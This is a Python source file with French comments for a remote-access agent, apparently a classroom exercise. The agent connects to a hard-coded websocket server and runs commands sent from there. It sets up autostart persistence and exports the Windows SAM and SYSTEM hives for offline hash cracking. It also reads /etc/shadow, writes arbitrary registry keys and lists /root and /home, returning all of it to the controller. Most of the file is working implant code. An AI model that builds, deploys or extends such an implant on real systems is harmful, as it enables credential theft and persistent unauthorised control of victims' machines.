import asyncio
import json
import logging
import platform
import os
import psutil
import subprocess
import sys
from pathlib import Path
import websockets
from common import make_hmac, timestamp, json_safe_loads

SERVER = "ws://192.168.100.3:8765"  # Pense à bien remplacer ça par l'ip de ta machine serveur nico/prof

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("simpleagent")

def get_non_loopback_ips():
    ips = []
    for iface, addrs in psutil.net_if_addrs().items():
        for a in addrs:
            fam = getattr(a.family, "name", str(a.family))
            if "AF_INET" in fam and not a.address.startswith("127."):
                ips.append(f"{iface}:{a.address}")
    return ips

def cmd_whoami():
    import getpass
    try:
        return getpass.getuser()
    except Exception:
        return "unknown"

def cmd_list(path=".", max_depth=1):
    result = []
    try:
        for root, dirs, files in os.walk(path):
            if path == "/":
                depth = root.count(os.sep)
                base_depth = 1
            else:
                depth = root[len(path):].count(os.sep)
                base_depth = 0

            result.append(root + ":")
            for d in dirs:
                result.append("  <dir> " + d)
            for f in files:
                result.append("  " + f)
            if depth - base_depth >= max_depth:
                dirs[:] = []
        return "\n".join(result) if result else "(empty)"
    except PermissionError:
        return "(permission denied)"
    except FileNotFoundError:
        return "(path not found)"
    except Exception as e:
        return f"(error: {e})"

def cmd_uptime():
    if os.name == "posix" and os.path.exists("/proc/uptime"):
        try:
            with open("/proc/uptime") as f:
                up = float(f.readline().split()[0])
                hours = int(up // 3600)
                mins = int((up % 3600) // 60)
                return f"up {hours}h {mins}m (from /proc/uptime)"
        except Exception:
            pass
    return "(uptime not available on this platform)"

def cmd_screenshot():
    try:
        import mss
    except Exception:
        return "mss not installed (pip install mss)"
    try:
        outdir = Path.cwd() / "screens"
        outdir.mkdir(parents=True, exist_ok=True)
        fname = outdir / "screenshot.png"
        with mss.mss() as sct:
            sct.shot(output=str(fname))
        return f"screenshot saved to {fname}"
    except Exception as e:
        return f"error taking screenshot: {e}"

ALLOWED_SHELL_COMMANDS = {
    "echo hello from server",
    "whoami",
    "hostname",
    "ipconfig" if platform.system().lower().startswith("win") else "ip a",
    "dir" if platform.system().lower().startswith("win") else "ls -la",
}

def cmd_run_shell(command: str):
    command = command.strip()
    if command not in ALLOWED_SHELL_COMMANDS:
        return f"(command '{command}' not allowed)"
    try:
        if platform.system().lower().startswith("win"):
            completed = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
        else:
            completed = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
        out = completed.stdout or ""
        err = completed.stderr or ""
        return (out + ("\n[stderr]\n" + err if err else "")).strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return "(command timeout)"
    except Exception as e:
        return f"(shell error: {e})"

def setup_autostart_linux():
    try:
        user_dir = Path.home() / ".config" / "systemd" / "user"
        user_dir.mkdir(parents=True, exist_ok=True)
        service_file = user_dir / "agent_ws.service"
        script_path = Path(__file__).resolve()
        content = f"""[Unit]
Description=WS agent demo
After=network-online.target

[Service]
Type=simple
ExecStart={sys.executable} {script_path}
Restart=on-failure

[Install]
WantedBy=default.target
"""
        service_file.write_text(content)
        return f"systemd user service created at {service_file} (enable with: systemctl --user enable --now agent_ws)"
    except Exception as e:
        return f"(autostart linux error: {e})"

def setup_autostart_windows():
    script_path = Path(__file__).resolve()
    cmd = (
        'schtasks /Create /SC ONLOGON /TN "WSAgentDemo" '
        f'/TR "{sys.executable} {script_path}"'
    )
    return f"Run this as admin in Windows to enable autostart:\n{cmd}"

def cmd_setup_autostart():
    if platform.system().lower().startswith("win"):
        return setup_autostart_windows()
    else:
        return setup_autostart_linux()

def cmd_get_simulated_sensitive():
    """Simule la récupération de données sensibles (pour démonstration)."""
    return "Simulated sensitive data: DEMO_PASSWORD_12345"

# ========== FONCTIONNALITÉS WINDOWS ==========
def cmd_get_sam_database():
    """Récupère la base SAM (Security Account Manager) de Windows"""
    if not platform.system().lower().startswith("win"):
        return "(commande Windows uniquement)"
    
    try:
        # Méthode 1: Utiliser reg save (nécessite admin)
        sam_file = Path.cwd() / "sam_export.hiv"
        system_file = Path.cwd() / "system_export.hiv"
        
        # Essayer d'exporter SAM avec un timeout plus court
        try:
            result = subprocess.run(
                f'reg save HKLM\\SAM "{sam_file}"',
                shell=True, capture_output=True, text=True, timeout=5
            )
        except subprocess.TimeoutExpired:
            return "(Timeout - La commande reg save a pris trop de temps. Vérifiez les permissions et UAC)"
        
        if result.returncode != 0:
            # Essayer une méthode alternative via PowerShell
            error_msg = result.stderr.strip() if result.stderr else "Erreur inconnue"
            return (f"(Accès refusé - méthode reg save)\n{error_msg}\n\n"
                   f"Alternative: Utilisez des outils comme 'pwdump' ou 'samdump2' avec des privilèges SYSTEM")
        
        # Essayer d'exporter SYSTEM
        try:
            result2 = subprocess.run(
                f'reg save HKLM\\SYSTEM "{system_file}"',
                shell=True, capture_output=True, text=True, timeout=5
            )
        except subprocess.TimeoutExpired:
            return f"(SAM exporté mais SYSTEM timeout)\nSAM: {sam_file}"
        
        sam_size = sam_file.stat().st_size if sam_file.exists() else 0
        system_size = system_file.stat().st_size if system_file.exists() else 0
        
        return (f"SAM database exportée:\n"
                f"- SAM: {sam_file} ({sam_size} bytes)\n"
                f"- SYSTEM: {system_file} ({system_size} bytes)\n"
                f"Utilisez des outils comme samdump2 ou impacket pour extraire les hash")
    except subprocess.TimeoutExpired:
        return "(timeout lors de l'export SAM - vérifiez les permissions)"
    except Exception as e:
        return f"(erreur export SAM: {e})"

def cmd_add_registry_key(key_path: str, value_name: str, value_data: str, value_type: str = "REG_SZ"):
    """Ajoute ou modifie une clef dans le registre Windows"""
    if not platform.system().lower().startswith("win"):
        return "(commande Windows uniquement)"
    
    try:
        # Types de registre supportés
        valid_types = ["REG_SZ", "REG_DWORD", "REG_BINARY", "REG_MULTI_SZ", "REG_EXPAND_SZ"]
        if value_type not in valid_types:
            return f"(type invalide, utilisez: {', '.join(valid_types)})"
        
        # Construction de la commande reg add
        cmd = f'reg add "{key_path}" /v "{value_name}" /t {value_type} /d "{value_data}" /f'
        
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
        except subprocess.TimeoutExpired:
            return "(Timeout lors de l'ajout de clef - vérifiez les permissions)"
        
        if result.returncode == 0:
            return f"Clef de registre ajoutée:\nChemin: {key_path}\nNom: {value_name}\nValeur: {value_data}\nType: {value_type}"
        else:
            return f"(erreur lors de l'ajout)\n{result.stderr}"
    except subprocess.TimeoutExpired:
        return "(timeout lors de l'ajout de clef)"
    except Exception as e:
        return f"(erreur registre: {e})"

# ========== FONCTIONNALITÉS LINUX ==========
def cmd_get_passwd_shadow():
    """Récupère le contenu de /etc/passwd et /etc/shadow (Linux)"""
    if not os.name == "posix":
        return "(commande Linux uniquement)"
    
    result = []
    
    # Lire /etc/passwd (accessible sans root)
    try:
        with open("/etc/passwd", "r") as f:
            passwd_content = f.read()
            # Limiter si trop long
            if len(passwd_content) > 100000:
                passwd_content = passwd_content[:100000] + "\n... (tronqué)"
            result.append("=== /etc/passwd ===")
            result.append(passwd_content)
    except PermissionError:
        result.append("=== /etc/passwd ===\n(permission denied)")
    except Exception as e:
        result.append(f"=== /etc/passwd ===\n(erreur: {e})")
    
    # Lire /etc/shadow (nécessite root)
    try:
        with open("/etc/shadow", "r") as f:
            shadow_content = f.read()
            # Limiter si trop long
            if len(shadow_content) > 100000:
                shadow_content = shadow_content[:100000] + "\n... (tronqué)"
            result.append("\n=== /etc/shadow ===")
            result.append(shadow_content)
    except PermissionError:
        result.append("\n=== /etc/shadow ===\n(permission denied - root requis)")
    except Exception as e:
        result.append(f"\n=== /etc/shadow ===\n(erreur: {e})")
    
    return "\n".join(result)

def cmd_list_root_home():
    """Liste le contenu de /root et /home de manière récursive (Linux)"""
    if not os.name == "posix":
        return "(commande Linux uniquement)"
    
    result = []
    file_count = 0
    max_files = 500  # Limiter le nombre de fichiers affichés
    
    # Lister /root
    result.append("=== /root (récursif) ===")
    try:
        for root, dirs, files in os.walk("/root"):
            if file_count >= max_files:
                result.append(f"... (liste tronquée à {max_files} entrées)")
                break
            level = root.replace("/root", "").count(os.sep)
            indent = " " * 2 * level
            result.append(f"{indent}{os.path.basename(root)}/")
            sub_indent = " " * 2 * (level + 1)
            for file in files[:min(50, len(files))]:  # Max 50 fichiers par dossier
                if file_count >= max_files:
                    break
                result.append(f"{sub_indent}{file}")
                file_count += 1
            if len(files) > 50:
                result.append(f"{sub_indent}... ({len(files) - 50} fichiers supplémentaires)")
    except PermissionError:
        result.append("(permission denied - root requis)")
    except Exception as e:
        result.append(f"(erreur: {e})")
    
    # Lister /home
    result.append("\n=== /home (récursif) ===")
    file_count = 0  # Reset counter
    try:
        for root, dirs, files in os.walk("/home"):
            if file_count >= max_files:
                result.append(f"... (liste tronquée à {max_files} entrées)")
                break
            level = root.replace("/home", "").count(os.sep)
            indent = " " * 2 * level
            result.append(f"{indent}{os.path.basename(root)}/")
            sub_indent = " " * 2 * (level + 1)
            for file in files[:min(50, len(files))]:  # Max 50 fichiers par dossier
                if file_count >= max_files:
                    break
                result.append(f"{sub_indent}{file}")
                file_count += 1
            if len(files) > 50:
                result.append(f"{sub_indent}... ({len(files) - 50} fichiers supplémentaires)")
    except PermissionError:
        result.append("(permission denied)")
    except Exception as e:
        result.append(f"(erreur: {e})")
    
    # Tronquer si trop long
    output = "\n".join(result)
    if len(output) > 500000:  # Limite à 500KB
        output = output[:500000] + f"\n\n... (output tronqué à 500KB)"
    
    return output
    
async def run_agent():
    while True:
        try:
            async with websockets.connect(SERVER) as ws:
                hello = {"os": platform.system(), "name": platform.node(), "ts": timestamp()}
                hello["hmac"] = make_hmac(json.dumps({"os": hello["os"], "name": hello["name"], "ts": hello["ts"]}).encode())
                await ws.send(json.dumps(hello))

                auth = await ws.recv()
                authobj = json_safe_loads(auth)
                if not authobj or authobj.get("status") != "auth_ok":
                    logger.error("Auth rejected by server")
                    return
                logger.info("Authenticated with server")

                while True:
                    msg = await ws.recv()
                    cmd = json_safe_loads(msg)
                    if not cmd:
                        continue
                    if cmd.get("cmd") == "bye":
                        logger.info("Session terminée")
                        break
                    cid = cmd.get("id")
                    name = cmd.get("cmd")
                    args = cmd.get("args") or {}

                    logger.info(f"Exécution de la commande: {name} (ID: {cid})")
                    
                    try:
                        if name == "whoami":
                            out = cmd_whoami()
                        elif name == "get_ips":
                            out = "\n".join(get_non_loopback_ips())
                        elif name == "list":
                            out = cmd_list(args.get("path", "."), int(args.get("max_depth", 1)))
                        elif name == "uptime":
                            out = cmd_uptime()
                        elif name == "screenshot":
                            out = cmd_screenshot()
                        elif name == "run_shell":
                            out = cmd_run_shell(args.get("command", "").strip())
                        elif name == "setup_autostart":
                            out = cmd_setup_autostart()
                        elif name == "get_simulated_sensitive":
                            out = cmd_get_simulated_sensitive()
                        # Commandes Windows
                        elif name == "get_sam":
                            out = cmd_get_sam_database()
                        elif name == "add_registry":
                            out = cmd_add_registry_key(
                                args.get("key_path", ""),
                                args.get("value_name", ""),
                                args.get("value_data", ""),
                                args.get("value_type", "REG_SZ")
                            )
                        # Commandes Linux
                        elif name == "get_passwd_shadow":
                            out = cmd_get_passwd_shadow()
                        elif name == "list_root_home":
                            out = cmd_list_root_home()
                        else:
                            out = f"(command '{name}' not allowed)"
                    except Exception as e:
                        logger.error(f"Erreur lors de l'exécution de {name}: {e}")
                        out = f"(error executing command: {e})"
                    
                    logger.info(f"Réponse générée pour {name}, taille: {len(str(out))} bytes")
                    
                    # Envoyer la réponse immédiatement
                    reply = {"id": cid, "status": "ok", "output": out}
                    await ws.send(json.dumps(reply))
                    logger.info(f"Réponse envoyée pour {name}")
        except Exception as e:
            logger.warning("Erreur ou déconnexion: %s — reconnexion dans 5s", e)
            await asyncio.sleep(5)


if __name__ == "__main__":
    asyncio.run(run_agent())